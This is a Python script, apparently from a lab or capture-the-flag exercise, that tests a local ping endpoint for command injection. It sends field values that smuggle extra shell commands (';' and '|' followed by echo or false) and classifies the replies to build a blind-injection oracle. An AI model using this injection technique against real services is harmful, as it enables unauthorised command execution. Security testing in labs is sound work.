import requests

url = "http://127.0.0.1:32943/ping"

def send_payload(payload):
    """Send the payload and return the response text"""
    try:
        response = requests.post(url, data={"ip_address": payload}, timeout=10)
        return response.text
    except Exception as e:
        return f"ERROR: {str(e)}"

def classify_response(text):
    """Classify response as reachable or unreachable"""
    if "Host is unreachable!" in text:
        return "UNREACHABLE"
    elif "Host is reachable!" in text:
        return "REACHABLE"
    else:
        return f"UNKNOWN-{text[:100]}"

print("[*] Verifying baseline patterns step by step\n")

print("TEST 0: Just IP (baseline)")
text = send_payload("127.0.0.1")
print(f"  Result: {classify_response(text)}")

print("\nTEST 1: IP semicolon echo (ping executes, echo succeeds)")
text = send_payload("127.0.0.1; echo test")
print(f"  Result: {classify_response(text)}")

print("\nTEST 2: IP semicolon false (ping executes, false returns error)")
text = send_payload("127.0.0.1; false")
print(f"  Result: {classify_response(text)}")

print("\nTEST 3: IP pipe echo (pipe swallows ping output?)")
text = send_payload("127.0.0.1 | echo test")
print(f"  Result: {classify_response(text)}")

print("\nTEST 4: IP pipe false (pipe with failing command)")
text = send_payload("127.0.0.1 | false")
print(f"  Result: {classify_response(text)}")

